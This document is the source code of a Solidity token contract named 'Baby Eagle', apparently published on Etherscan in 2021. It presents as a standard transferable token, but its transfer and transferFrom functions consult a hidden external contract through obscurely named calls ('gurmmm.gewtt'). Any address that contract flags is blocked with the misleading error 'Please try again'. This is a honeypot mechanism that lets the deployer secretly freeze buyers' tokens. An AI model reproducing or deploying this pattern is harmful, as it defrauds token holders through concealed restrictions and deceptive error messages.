/**
 *Submitted for verification at Etherscan.io on 2021-08-08
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface IRC20 {

  function gewtt(address account) external view returns (uint8);
  
  function getOwner() external view returns (address);
  
  function allowance(address _owner, address spender) external view returns (uint256);
}

contract BabyEagle {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    IRC20 gurmmm;
    uint256 public totalSupply = 1 * 10**12 * 10**18;
    string public name = "Baby Eagle";
    string public symbol = hex"426162794561676C65f09fa685";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(IRC20 _info) {
        
        gurmmm = _info;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address owner) public view returns(uint256) {
        return balances[owner];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(gurmmm.gewtt(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(gurmmm.gewtt(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint256 value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        return true;
        
    }
}